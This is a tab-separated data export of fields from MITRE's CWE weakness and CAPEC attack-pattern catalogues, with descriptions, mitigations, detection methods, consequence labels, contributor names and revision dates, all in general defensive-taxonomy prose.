18997	51	2014-06-23
8983	35	MITRE
14352	62	updated Relationships, Observed_Example, Taxonomy_Mappings
16900	63	Unexpected State
22238	39	2012-10-30
12936	27	None: No specialized resources are required to execute this type of attack.
20656	39	2012-05-11
13476	35	MITRE
15695	28	CWE Content Team
21850	39	2008-09-08
22763	42	When available, use publicly-vetted algorithms and procedures, as these are more likely to undergo more extensive security analysis and testing. This is especially the case with encryption and authentication.
14664	33	Frank Kim
19576	35	MITRE
25357	28	CWE Content Team
14761	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
23297	39	2019-01-03
14281	31	699
14048	42	Utilize a user prompt pop-up to authorize potentially harmful actions such as those modifying data or dealing with sensitive information.                   When designing functionality of actions in the URL scheme, consider whether the action should be accessible to all mobile applications, or if a whitelist of applications to interface with is appropriate.
7575	39	2008-10-14
10121	50	Implementation: If the session identifier is used for authentication, such as in the so-called single sign on use cases, then ensure that it is protected at the same level of assurance as authentication tokens.
16294	77	Manual Static Analysis - Binary or Bytecode
20499	103	Primary
16019	91	Implementation
5942	35	MITRE
25214	39	2011-06-01
23182	35	MITRE
22818	35	MITRE
8607	39	2008-10-14
6496	62	updated Time_of_Introduction
21600	26	Implementation
18778	28	CWE Content Team
6307	28	CWE Content Team
11499	40	A framework-based language that supports code signing (such as, and most commonly, Java or .NET)
7844	39	2008-07-01
15693	28	CWE Content Team
10042	46	In many languages the compare statement is very close in appearance to the assignment statement and are often confused. This bug is generally the result of a typo and usually causes obvious problems with program execution. If the comparison is in an if statement, the if statement will usually evaluate the value of the right-hand side of the predicate.
11191	35	MITRE
19789	49	2010
16742	63	Other
23353	39	2015-12-07
15930	23	When an application does not use an input validation framework such as the Struts Validator, there is a greater risk of introducing weaknesses related to insufficient input validation.
9730	95	The attacker modifies the environment variable to abuse the normal flow of processes or to gain access to privileged resources.
11586	35	MITRE
21816	28	CWE Content Team
21565	35	MITRE
23894	55	CAPEC Content Team
10949	50	Design: Harden registry server and file access permissions
13342	62	updated Relationships, Taxonomy_Mappings
11077	101	CAPEC Content Team
10499	76	2018-07-31
23738	104	193
12172	35	MITRE
24711	28	CWE Content Team
7198	62	updated Relationships
10036	45	Base
8215	35	MITRE
7738	73	Sniff network communications with application using a utility such as WireShark.
14436	56	ChildOf
5820	45	Base
17761	39	2011-03-29
9457	40	Target application server must allow remote files to be included in the "require", "include", etc. PHP directives
19181	35	MITRE
20400	30	J. Samuel
14094	62	updated Description
14490	28	CWE Content Team
15154	39	2012-05-11
18932	62	updated Relationships
20668	72	Sensitive information may possibly be leaked through data queries accidentally.
24911	43	Simple
12150	31	699
19910	28	CWE Content Team
10861	91	Implementation
21498	76	2018-07-31
17459	63	DoS: Crash, Exit, or Restart
10347	81	Availability
18531	55	CAPEC Content Team
20314	56	ChildOf
11101	35	MITRE
21978	39	2014-02-18
23044	23	In applications, particularly web applications, access to functionality is mitigated by an authorization framework. This framework maps Access Control Lists (ACLs) to elements of the application's functionality; particularly URL's for web apps. In the case that the administrator failed to specify an ACL for a particular element, an attacker may be able to access it with impunity. An attacker with the ability to access functionality not properly constrained by ACLs can obtain sensitive information and possibly compromise the entire application. Such an attacker can access resources that must be available only to users at a higher privilege level, can access management sections of the application, or can run queries for data that they otherwise not supposed to.
23271	62	updated Common_Consequences
17931	39	2009-05-27
18681	28	CWE Content Team
11784	28	CWE Content Team
25365	51	2014-06-23
9167	62	updated Relationships
8743	79	Access Control
12989	21	7 Pernicious Kingdoms
21288	39	2017-11-08
15317	92	Experiment
12659	92	Experiment
7218	44	SOAR Partial
24673	56	ChildOf
21646	104	493
9753	91	Operation
16808	77	Dynamic Analysis with Manual Results Interpretation
8084	39	2008-07-01
10399	103	Primary
24665	28	CWE Content Team
25355	79	Authorization
15341	60	19
8553	79	Confidentiality
22887	28	CWE Content Team
22179	35	MITRE
16361	21	CLASP
6284	27	The adversary needs a data tampering tool capable of generating and creating custom inputs to aid in the attack, like Fiddler, Wireshark, or a similar in-browser plugin (e.g., Tamper Data for Firefox).
7636	91	Implementation
22131	62	updated Potential_Mitigations
9324	86	http://www.azimuthsecurity.com/resources/bh2009_dowd_smith_dewey.pdf
24380	39	2010-12-13
20780	73	Trick the victim to the malicious site by manipulating URLs on a site trusted by the victim.
21642	23	The software misinterprets an input, whether from an attacker or another product, in a security-relevant fashion.
14814	43	Simple
24806	100	The MITRE Corporation
13862	42	Compartmentalize the system to have "safe" areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area.                   Ensure that appropriate compartmentalization is built into the system design and that the compartmentalization serves to allow for and further reinforce privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide when it is appropriate to use and to drop system privileges.
22219	79	Authentication
13027	62	updated Modes_of_Introduction, References, Relationships
18908	100	The MITRE Corporation
24824	101	CAPEC Content Team
14095	39	2012-05-11
21491	31	1000
16137	62	updated References
20240	28	CWE Content Team
21003	35	MITRE
21994	81	Access Control
6559	62	updated Potential_Mitigations
19368	59	Updated Resources_Required
24533	81	Availability
23449	39	2008-07-01
12434	45	Variant
17159	43	Simple
13448	48	04
25037	28	CWE Content Team
15374	56	ChildOf
8959	23	The software receives data from an upstream component, but only accounts for special elements positioned relative to a marker (e.g. "at the beginning/end of a string; the second argument"), thereby missing remaining special elements that may exist before sending it to a downstream component.
9753	42	Use resource-limiting settings provided by the operating system or environment. For example, when managing system resources in POSIX, setrlimit() can be used to set limits for certain types of resources, and getrlimit() can determine how many resources are available. However, these functions are not available on all operating systems.                   When the current levels get close to the maximum that is defined for the application (see CWE-770), then limit the allocation of further resources to privileged users; alternately, begin releasing resources for less-privileged users. While this mitigation may protect the system from attack, it will not necessarily stop attackers from adversely impacting other users.                   Ensure that the application performs the appropriate error checks and error handling in case resources become unavailable (CWE-703).
21782	70	Security Considerations - IP Fragment Filtering
18793	23	An attacker manipulates files or settings external to a target application which affect the behavior of that application. For example, many applications use external configuration files and libraries - modification of these entities or otherwise affecting the application's ability to use them would constitute a configuration/environment manipulation attack.
19883	39	2014-06-23
22217	59	Updated Related_Attack_Patterns
11675	56	ChildOf
24014	81	Access Control
25054	104	575
13445	69	Draft
23226	31	1000
6235	59	Updated Related_Attack_Patterns
11913	73	The attacker proceeds to reverse engineer the captured code.
17712	79	Authorization
21181	61	Draft
18404	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Source code Weakness Analyzer                            Context-configured Source Code Weakness Analyzer
10540	35	MITRE
16631	28	CWE Content Team
10954	92	Exploit
7261	76	2018-07-31
20585	79	Authorization
15955	21	CWE Content Team
19314	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Binary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies
13405	35	MITRE
24344	28	CWE Content Team
9552	23	When setting a new password for a user, the product does not require knowledge of the original password, or using another form of authentication.
19095	28	CWE Content Team
22591	26	Architecture and Design
16907	46	Even if a certificate is well-formed, signed, and follows the chain of trust, it may simply be a valid certificate for a different site than the site that the software is interacting with. If the certificate's host-specific data is not properly checked - such as the Common Name (CN) in the Subject or the Subject Alternative Name (SAN) extension of an X.509 certificate - it may be possible for a redirection or spoofing attack to allow a malicious host with a valid certificate to provide data, impersonating a trusted host. In order to ensure data integrity, the certificate must be valid and it must pertain to the site that is being accessed.             Even if the software attempts to check the hostname, it is still possible to incorrectly check the hostname. For example, attackers could create a certificate with a name that begins with a trusted name followed by a NUL byte, which could cause some string-based comparisons to only examine the portion that contains the trusted name.             This weakness can occur even when the software uses Certificate Pinning, if the software does not verify the hostname at the time a certificate is pinned.
9449	42	Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.
16985	39	2019-06-20
6506	62	updated Type
21734	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Web Application Scanner                            Web Services Scanner                            Database Scanners
9791	28	CWE Content Team
21933	77	Automated Static Analysis
12487	39	2008-09-08
22608	62	updated Common_Consequences, Other_Notes, Potential_Mitigations, References, Relationship_Notes, Relationships
22231	63	Other
8375	28	CWE Content Team
22098	56	ChildOf
20306	39	2013-07-17
9371	62	updated Relationships
6796	45	Variant
12640	62	updated Potential_Mitigations
14486	42	Resolve all URIs to absolute or canonical representations before processing.
14599	33	Sam Thomas
15154	62	updated Relationships, Taxonomy_Mappings
7288	39	2011-09-13
11933	28	CWE Content Team
14340	100	The MITRE Corporation
22617	26	Implementation
16584	62	updated Type
7581	86	http://www.ddj.com/cpp/184403766
13275	28	CWE Content Team
10545	103	Primary
22480	28	CWE Content Team
24015	28	CWE Content Team
21581	26	Architecture and Design
12211	39	2013-07-17
21024	28	CWE Content Team
12716	31	1000
10152	35	MITRE
21541	102	ChildOf
12271	39	2010-04-05
9400	104	87
7542	89	Detailed
20013	69	Draft
20074	104	806
13736	97	Application API Navigation Remapping
9712	63	Other
7137	28	CWE Content Team
20834	103	Primary
15664	33	Federal Trade Commission
25185	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.                   When validating filenames, use stringent whitelists that limit the character set to be used. If feasible, only allow a single "." character in the filename to avoid weaknesses such as CWE-23, and exclude directory separators such as "/" to avoid CWE-36. Use a whitelist of allowable file extensions, which will help to avoid CWE-434.                   Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a blacklist, which may be incomplete (CWE-184). For example, filtering "/" is insufficient protection if the filesystem also supports the use of "\" as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if "../" sequences are removed from the ".../...//" string in a sequential fashion, two instances of "../" would be removed from the original string, but the remaining characters would still form the "../" string.
20484	35	Cigital
11651	77	Dynamic Analysis with Automated Results Interpretation
19398	28	CWE Content Team
13389	28	CWE Content Team
20520	39	2012-05-11
8945	56	ChildOf
7584	28	Eric Dalci
14214	40	An application does not perform sufficient validation to ensure that user-controllable data is safe for an XML parser.
17636	62	updated Time_of_Introduction
14249	39	2008-10-14
19770	39	2011-09-13
23245	57	Indirect
9472	59	Updated Related_Attack_Patterns
6811	35	MITRE
8171	100	The MITRE Corporation
6763	48	03
25001	35	MITRE
12638	62	updated Other_Notes, Relationship_Notes, Theoretical_Notes
13673	88	External Control of Assumed-Immutable Web Parameter
8401	104	656
14479	92	Experiment
23592	53	The MITRE Corporation
6173	96	2008-01-30
8222	32	MindPride
21307	86	https://dl.acm.org/citation.cfm?doid=1519144.1519145
9349	27	The attacker must have sufficient access to send messages to the target. The attacker must also have the ability to observe the stack trace produced by the target application. Fuzzing tools, which automatically generate and send message variants, are necessary for this attack.
20730	95	[Run arbitrary server-side code] As the adversary succeeds in exploiting the vulnerability, they are able to execute server-side code within the application. The malicious code has virtual access to the same resources as the targeted application. Note that the adversary might include shell code in their script and execute commands on the server under the same privileges as the PHP runtime is running with.
18744	26	Architecture and Design
11632	35	Cigital
23002	28	CWE Content Team
22374	35	MITRE
11763	39	2012-05-11
23425	77	Manual Static Analysis - Source Code
9462	39	2012-05-11
15237	81	Integrity
18874	35	MITRE
17734	81	Integrity
9241	28	Eric Dalci
10785	39	2010-06-21
23027	57	Indirect
6600	104	912
7588	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Focused Manual Spotcheck - Focused manual analysis of source                            Manual Source Code Review (not inspections)
14348	28	CWE Content Team
7923	91	Architecture and Design
20711	55	CAPEC Content Team
23069	35	MITRE
13304	28	CWE Content Team
11873	94	Run Arbitrary Code
20690	35	MITRE
14179	62	updated Demonstrative_Examples
14929	62	updated Potential_Mitigations
16185	80	A number of web service digging tools are available for free that help discover exposed web services and their interfaces. In the event that a web service is not listed, the attacker does not need to know much more in addition to the format of web service messages that he can sniff/monitor for.
24573	56	ChildOf
8398	59	Updated Related_Attack_Patterns
11425	28	CWE Content Team
5741	28	CWE Content Team
24943	62	updated Description, Other_Notes
19676	31	699
11579	50	Design: Run server interfaces with a non-root account and/or utilize chroot jails or other configuration techniques to constrain privileges even if attacker gains some limited access to commands.
19041	89	Standard
7320	49	2012
21286	62	updated Potential_Mitigations, Time_of_Introduction
6139	81	Availability
14049	96	2013-06-23
11256	39	2008-11-24
12120	27	None: No specialized resources are required to execute this type of attack. Detecting and exploiting a buffer overflow does not require any resources beyond knowledge of and access to the target system.
14400	28	CWE Content Team
18701	31	1000
18429	69	Draft
18912	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Bytecode Weakness Analysis - including disassembler + source code weakness analysis                            Binary Weakness Analysis - including disassembler + source code weakness analysis
14936	104	779
5820	90	Language-Independent
16206	39	2017-11-08
10037	56	ChildOf
14263	63	DoS: Crash, Exit, or Restart
17012	100	The MITRE Corporation
22170	39	2017-11-08
11045	62	updated Relationships
25202	56	ChildOf
8702	39	2010-02-16
14672	50	Implementation: Obfuscate database type in Database API's error message.
11310	62	updated Applicable_Platforms
22623	46	This issue makes it more difficult to maintain the software, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.
20289	31	699
5833	39	2010-04-05
19937	23	An attacker uses standard SQL injection methods to inject data into the command line for execution. This could be done directly through misuse of directives such as MSSQL_xp_cmdshell or indirectly through injection of data into the database that would be interpreted as shell commands. Sometime later, an unscrupulous backend application (or could be part of the functionality of the same application) fetches the injected data stored in the database and uses this data as command line arguments without performing proper validation. The malicious data escapes that data plane by spawning new commands to be executed on the host.
12510	35	MITRE
23530	28	CWE Content Team
24668	77	Dynamic Analysis with Manual Results Interpretation
8997	50	Operation: When maintaining an authenticated session with a privileged target system, do not use the same browser to navigate to unfamiliar sites to perform other activities. Finish working with the target system and logout first before proceeding to other tasks.
10902	26	Architecture and Design
10025	104	54
11769	39	2010-04-05
8617	49	2006
12036	81	Other
17113	53	The MITRE Corporation
14611	78	Medium
23163	69	Incomplete
6134	47	Gain Privileges
12067	62	updated Relationships
21109	104	143
20119	43	Simple
19749	90	C
11499	27	The Attacker needs no special resources beyond the listed prerequisites in order to conduct this style of attack.
22832	62	updated Relationships, Taxonomy_Mappings
20610	101	CAPEC Content Team
21284	47	Gain Privileges
10514	39	2010-06-21
11579	50	Implementation: Use possible permissions on file access when developing and deploying web applications.
23947	62	updated Relationships, Type
8049	28	CWE Content Team
21017	28	CWE Content Team
14692	39	2012-05-11
7769	39	2013-02-21
11693	28	Eric Dalci
11122	47	Read Data
16044	28	CWE Content Team
11145	58	Serialization and deserialization refer to the process of taking program-internal object-related data, packaging it in a way that allows the data to be externally stored or transferred ("serialization"), then extracting the serialized data to reconstruct the original object ("deserialization").
24062	62	updated Applicable_Platforms
17507	39	2011-06-01
15804	28	Eric Dalci
23239	23	An adversary engages in probing and exploration activities to identify constituents and properties of the target. Footprinting is a general term to describe a variety of information gathering techniques, often used by attackers in preparation for some attack. It consists of using tools to learn as much as possible about the composition, configuration, and security mechanisms of the targeted application, system or network. Information that might be collected during a footprinting effort could include open ports, applications and their versions, network topology, and similar information. While footprinting is not intended to be damaging (although certain activities, such as network scans, can sometimes cause disruptions to vulnerable applications inadvertently) it may often pave the way for more damaging attacks.
14146	43	Simple
16370	90	Language-Independent
10139	57	Indirect
5599	62	updated Observed_Examples
14222	39	2008-09-08
17471	26	Implementation
17309	39	2014-02-18
20927	91	Implementation
18948	62	updated Description, Other_Notes
12216	39	2008-09-08
16098	72	Without OAEP in RSA encryption, it will take less work for an attacker to decrypt the data or to infer patterns from the ciphertext.
18930	35	MITRE
14503	72	Unchecked input leads to cross-site scripting, process control, and SQL injection vulnerabilities, among others.
6911	76	2017-05-01
14874	23	An attacker examines a target system to find sensitive data that has been embedded within it. This information can reveal confidential contents, such as account numbers or individual keys/credentials that can be used as an intermediate step in a larger attack.
10322	81	Availability
12757	54	Medium
23784	101	CAPEC Content Team
20281	102	ChildOf
16073	62	updated Potential_Mitigations
21646	45	Variant
6265	47	Unreliable Execution
15623	69	Incomplete
17802	62	updated Name
20170	28	CWE Content Team
17584	39	2010-04-05
12032	24	MITRE
23014	35	MITRE
12567	89	Detailed
7498	77	Manual Static Analysis - Binary or Bytecode
16916	91	Implementation
10412	39	2011-06-01
7145	62	updated Name, Relationships
16416	45	Variant
6483	55	CAPEC Content Team
8450	76	2019-04-04
17183	27	Attacker controlled site/page to render a page referencing the injected CSS string
23427	61	Draft
12790	56	CanPrecede
17262	80	Cryptanalysis generally requires a very significant level of understanding of mathematics and computation.
23025	72	The true value of the data is lost and corrupted data is used.
13781	91	Implementation
17674	28	CWE Content Team
22687	35	MITRE
15013	62	updated Potential_Mitigations
21597	26	Architecture and Design
8169	28	CWE Content Team
16832	28	CWE Content Team
7683	59	Updated Related_Attack_Patterns
17817	62	updated Potential_Mitigations
24813	59	Updated @Name, Notes, Related_Weaknesses
17373	28	CWE Content Team
11702	70	Fortify Taxonomy of Vulnerabilities
11540	62	updated Common_Consequences
11182	85	64
8627	39	2009-10-29
13799	35	MITRE
9192	28	CWE Content Team
24258	62	updated Taxonomy_Mappings
19265	39	2012-05-11
16907	45	Variant
23091	104	1025
10658	39	2011-03-29
8834	39	2012-05-11
6186	56	ChildOf
17549	62	updated Relationships, Relationship_Notes, Taxonomy_Mappings
6342	81	Other
20786	23	The application stores sensitive information in cleartext within the GUI.
18100	28	CWE Content Team
11545	31	1000
10352	28	CWE Content Team
14991	55	CAPEC Content Team
24642	48	10
22964	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
9809	100	The MITRE Corporation
17756	23	This OS fingerprinting probe examines the remote server's implementation of TCP timestamps. Not all operating systems implement timestamps within the TCP header, but when timestamps are used then this provides the attacker with a means to guess the operating system of the target. The attacker begins by probing any active TCP service in order to get response which contains a TCP timestamp. Different Operating systems update the timestamp value using different intervals. This type of analysis is most accurate when multiple timestamp responses are received and then analyzed. TCP timestamps can be found in the TCP Options field of the TCP header.
17834	52	Certain automated dynamic analysis techniques may be effective in producing side effects of uncontrolled resource allocation problems, especially with resources such as processes, memory, and connections. The technique may involve generating a large number of requests to the software within a short time frame. Manual analysis is likely required to interpret the results.
16879	35	MITRE
24581	62	updated Relationships, Taxonomy_Mappings
9380	35	MITRE
23112	28	CWE Content Team
6450	39	2011-03-29
24670	35	MITRE
14277	28	Eric Dalci
24904	63	Read Files or Directories
17541	89	Detailed
25076	56	ChildOf
18812	62	updated Relationships, Observed_Example, Taxonomy_Mappings
5831	81	Confidentiality
20153	80	The attacker may need deep understanding of the host target in order to exploit the vulnerability. The attacker may also use automated tools to probe for this vulnerability.
9793	31	1000
21205	92	Experiment
11298	23	Not using a random initialization Vector (IV) with Cipher Block Chaining (CBC) Mode causes algorithms to be susceptible to dictionary attacks.
16616	39	2009-10-29
23518	62	updated Applicable_Platforms, Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings, Weakness_Ordinalities
22677	24	MITRE
22761	56	ChildOf
12691	53	The MITRE Corporation
20466	63	Unexpected State
12894	63	Gain Privileges or Assume Identity
23987	62	updated Common_Consequences, Relationships
18427	79	Access Control
9642	28	CWE Content Team
12753	90	C++
19217	44	High
24792	86	http://www.javaranch.com/journal/2008/04/authentication-using-JAAS.html
24352	80	The adversary knows how to send HTTP request, run the scan tool.
13994	35	KDM Analytics
22622	91	Operation
5895	62	updated Potential_Mitigations, Time_of_Introduction
23537	88	Information Exposure Through Browser Caching
12529	39	2012-05-11
22142	61	Draft
8218	90	Language-Independent
24940	88	Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition')
14097	56	CanAlsoBe
6924	81	Other
6811	28	CWE Content Team
20114	56	ChildOf
21713	74	2
16239	56	ChildOf
8894	103	Primary
18153	92	Experiment
22335	62	updated Common_Consequences
24019	35	MITRE
21925	104	692
10353	93	Defense in Depth
23433	35	MITRE
16719	35	MITRE
8242	62	updated Relationships
10723	102	ChildOf
16613	69	Incomplete
7266	105	Web Based
15596	62	updated Other_Notes, Relationships, Taxonomy_Mappings
14754	39	2011-06-01
20620	35	MITRE
9562	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Binary / Bytecode Quality Analysis                            Compare binary / bytecode to application permission manifest
8782	89	Meta
21347	35	MITRE
23415	28	CWE Content Team
21184	62	updated References
9400	69	Draft
15018	63	Unexpected State
12454	21	Anonymous Tool Vendor (under NDA)
17751	35	MITRE
7164	73	Use a proxy tool to record all links visited during a manual traversal of the web application. Make special note of any links that include parameters in the URL. Manual traversal of this type is frequently necessary to identify forms that are GET method forms rather than POST forms.
17062	47	Read Data
15775	58	The chroot() system call allows a process to change its perception of the root directory of the file system. After properly invoking chroot(), a process cannot access any files outside the directory tree defined by the new root directory. Such an environment is called a chroot jail and is commonly used to prevent the possibility that a processes could be subverted and used to access unauthorized files. For instance, many FTP servers run in chroot jails to prevent an attacker who discovers a new vulnerability in the server from being able to download the password file or other sensitive files on the system.
8146	39	2014-06-23
24906	63	Reduce Maintainability
20209	28	CWE Content Team
8361	26	Operation
18169	35	MITRE
14764	26	Implementation
16840	28	CWE Content Team
18140	28	CWE Content Team
11785	39	2011-09-13
16026	66	XMLHttpRequest allows reading HTTPOnly cookies
17065	39	2011-06-27
13213	63	Reduce Maintainability
11607	35	MITRE
9026	26	Architecture and Design
25054	90	Java
8957	39	2008-09-08
22700	39	2008-07-01
22438	35	MITRE
10384	89	Standard
19750	97	Manipulating Opaque Client-based Data Tokens
10231	28	CWE Content Team
9652	56	ChildOf
18960	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Host Application Interface Scanner                                                                     Cost effective for partial coverage:                                                                           Fuzz Tester                            Framework-based Fuzzer                            Automated Monitored Execution                            Forced Path Execution
13563	104	606
8429	91	Architecture and Design
19181	62	added maintenance note: this entry will probably be deprecated
13836	28	CWE Content Team
5726	62	updated Demonstrative_Examples, Relationships
23800	28	CWE Content Team
12145	61	Draft
20996	39	2008-07-01
8451	50	Design: Input validation routines should check and enforce both input data types and content against a positive specification. In regards to IP addresses, this should include the authorized manner for the application to represent IP addresses and not accept user specified IP addresses and IP address formats (such as ranges)
19237	97	Account Footprinting
6941	47	Gain Privileges
24824	76	2018-07-31
15030	28	CWE Content Team
24375	85	581
19258	26	Implementation
5873	62	updated Relationships, Taxonomy_Mappings
10724	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Fuzz Tester                            Framework-based Fuzzer
17584	28	CWE Content Team
17434	28	CWE Content Team
18586	62	updated Relationships
5843	46	An empty synchronized block does not actually accomplish any synchronization and may indicate a troubled section of code. An empty synchronized block can occur because code no longer needed within the synchronized block is commented out without removing the synchronized block.
22218	28	CWE Content Team
9839	86	http://www.fortify.com/vulncat/en/vulncat/cpp/race_condition_signal_handling.html
24958	62	updated Related_Attack_Patterns
5654	62	updated References
23294	35	MITRE
16546	62	updated Potential_Mitigations
5735	39	2019-06-20
11494	28	CWE Content Team
7346	28	CWE Content Team
23021	104	340
15168	39	2012-05-11
9946	103	Primary
16267	59	Updated Attack_Phases, Description, Description Summary, Examples-Instances, Payload_Activation_Impact, Resources_Required
18831	31	1000
25247	100	The MITRE Corporation
9027	40	The targeted application must rely on values stored in a registry.
20385	102	ChildOf
9988	39	2009-03-10
21750	62	updated Modes_of_Introduction, Relationships
8681	62	updated Relationships, Taxonomy_Mappings
15535	56	ChildOf
10303	53	The MITRE Corporation
14624	73	Use a proxy tool to record results, error messages and/or log if accessible.
5948	80	The attacker needs to setup a sniffer for a sufficient period of time so as to capture meaningful quantities of code. The presence of the sniffer should not be detected on the network. Also if the attacker plans to employ a man-in-the-middle attack, the client or server must not realize this. Finally, the attacker needs to regenerate source code from binary code if the need be.
22014	54	Medium
15031	35	MITRE
25335	39	2008-09-08
24542	35	MITRE
9290	35	MITRE
17780	35	MITRE
23506	66	Herb Schildt's C++ Programming Cookbook
16292	81	Confidentiality
20456	62	updated Applicable_Platforms
20790	39	2011-06-01
15493	35	MITRE
22549	56	ChildOf
23154	40	An application that failS to adequately sanitize or encode untrusted input.
8739	50	Design: Tunnel communications through a secure proxy                Design: Trust level separation for privileged / non privileged interactions (e.g., two different browsers, two different users, two different operating systems, two different virtual machines)
13347	35	MITRE
12981	62	updated Relationships
22096	62	updated Description, Name
24629	35	MITRE
18588	69	Draft
15209	47	Modify Data
15262	46	When a program releases memory, but it maintains a pointer to that memory, then the memory might be re-allocated at a later time. If the original pointer is accessed to read or write data, then this could cause the program to read or modify data that is in use by a different function or process. Depending on how the newly-allocated memory is used, this could lead to a denial of service, information exposure, or code execution.
8291	63	Read Application Data
10686	56	ChildOf
10306	103	Primary
6782	95	Block access to the external libraries accessed by the application.
10674	28	CWE Content Team
22157	69	Incomplete
9417	104	820
13063	88	Incomplete Blacklist
6212	68	This approach is still susceptible to calculation errors, including issues such as off-by-one errors (CWE-193) and incorrectly calculating buffer lengths (CWE-131). Additionally, this only addresses potential overflow issues. Resource consumption / exhaustion issues are still possible.
10972	39	2008-09-08
7816	39	2017-11-08
23618	23	A transparent proxy serves as an intermediate between the client and the internet at large. It intercepts all requests originating from the client and forwards them to the correct location. The proxy also intercepts all responses to the client and forwards these to the client. All of this is done in a manner transparent to the client. Transparent proxies are often used by enterprises and ISPs. For requests originating at the client transparent proxies need to figure out the final destination of the client's data packet. Two ways are available to do that: either by looking at the layer three (network) IP address or by examining layer seven (application) HTTP header destination. A browser has same origin policy that typically prevents scripts coming from one domain initiating requests to other websites from which they did not come. To circumvent that, however, malicious Flash or an Applet that is executing in the user's browser can attempt to create a cross-domain socket connection from the client to the remote domain. The transparent proxy will examine the HTTP header of the request and direct it to the remote site thereby partially bypassing the browser's same origin policy. This can happen if the transparent proxy uses the HTTP host header information for addressing rather than the IP address information at the network layer. This attack allows malicious scripts inside the victim's browser to issue cross-domain requests to any hosts accessible to the transparent proxy.
19641	62	updated Common_Consequences
21302	21	PLOVER
25119	28	CWE Content Team
16367	57	Primary
19490	66	XPath Injection
7277	90	Language-Independent
12889	99	Wikipedia
5768	62	updated Potential_Mitigations, Time_of_Introduction
7383	39	2008-07-01
13685	59	Updated Related_Weaknesses
7470	35	Cigital
12701	28	CWE Content Team
15154	35	MITRE
10364	28	CWE Content Team
13195	28	CWE Content Team
18722	23	The software processes an XML document that can contain XML entities with URIs that resolve to documents outside of the intended sphere of control, causing the product to embed incorrect documents into its output.
24113	61	Draft
21927	56	Requires
20374	39	2009-03-10
17369	91	Architecture and Design
13561	39	2011-06-01
17052	39	2009-10-29
22606	35	MITRE
10331	84	01
8473	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
19172	51	2014-06-23
8740	35	MITRE
20757	62	updated Observed_Examples, Potential_Mitigations
19872	50	Implementation: Perform output validation for all remote content.
24624	103	Primary
12685	56	CanPrecede
9152	62	updated Relationships
22750	39	2010-02-16
7068	39	2008-11-24
6144	69	Incomplete
16908	59	Updated Attack_Motivation-Consequences
7022	62	updated Demonstrative_Examples
13409	28	CWE Content Team
21552	47	Execute Unauthorized Commands
21444	35	MITRE
10514	62	updated Common_Consequences, Potential_Mitigations, References, Relationships
11619	101	CAPEC Content Team
17353	42	Compartmentalize the system to have "safe" areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area.                   Ensure that appropriate compartmentalization is built into the system design and that the compartmentalization serves to allow for and further reinforce privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide when it is appropriate to use and to drop system privileges.
20628	59	Updated Description Summary
20875	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Bytecode Weakness Analysis - including disassembler + source code weakness analysis                            Binary Weakness Analysis - including disassembler + source code weakness analysis
8906	85	550
9235	26	Operation
13103	28	CWE Content Team
24694	39	2014-07-30
24256	40	An environment variable is accessible to the user.
9051	28	CWE Content Team
20111	28	CWE Content Team
19779	62	updated Common_Consequences
17278	33	OWASP
21741	100	The MITRE Corporation
18088	56	ChildOf
21115	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Bytecode Weakness Analysis - including disassembler + source code weakness analysis                            Binary Weakness Analysis - including disassembler + source code weakness analysis
15235	104	565
7137	62	updated Relationships
22015	62	updated Relationships, Taxonomy_Mappings
10833	28	CWE Content Team
7417	39	2009-10-29
20485	51	2014-06-23
17468	77	Automated Static Analysis - Source Code
24634	26	Implementation
23711	35	MITRE
17926	51	2014-06-23
10143	39	2012-05-11
18649	39	2014-07-30
24518	31	699
13439	92	Explore
20746	39	2009-03-10
6878	73	Induce errors to find informative error messages
23247	39	2009-07-27
19177	88	Information Exposure Through Java Runtime Error Message
9669	36	http://en.wikipedia.org/wiki/Greasemonkey
17257	62	updated Relationships, Other_Notes, Taxonomy_Mappings
13294	52	Automated static analysis is useful for detecting commonly-used idioms for authentication. A tool may be able to analyze related configuration files, such as .htaccess in Apache web servers, or detect the usage of commonly-used authentication libraries.                   Generally, automated static analysis tools have difficulty detecting custom authentication schemes. In addition, the software's design may include some functionality that is accessible to any user and does not require an established identity; an automated technique that detects the absence of authentication may report false positives.
15790	31	1000
17032	53	The MITRE Corporation
20470	43	Simple
